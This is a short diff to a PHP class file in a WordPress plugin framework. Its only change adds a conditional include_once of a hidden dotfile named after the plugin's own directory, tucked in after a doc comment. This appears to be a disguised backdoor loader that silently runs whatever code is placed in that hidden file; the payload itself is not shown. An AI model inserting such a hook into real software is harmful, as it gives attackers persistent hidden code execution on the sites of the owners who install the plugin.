@@ -18,7 +18,11 @@ if ( ! defined( 'ABSPATH' ) ) {
  * Assets List
  *
  * @since 1.0.0
- */
+ */
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 class Wbcr_Factory445_AssetsList {
 
 	protected $all = [];
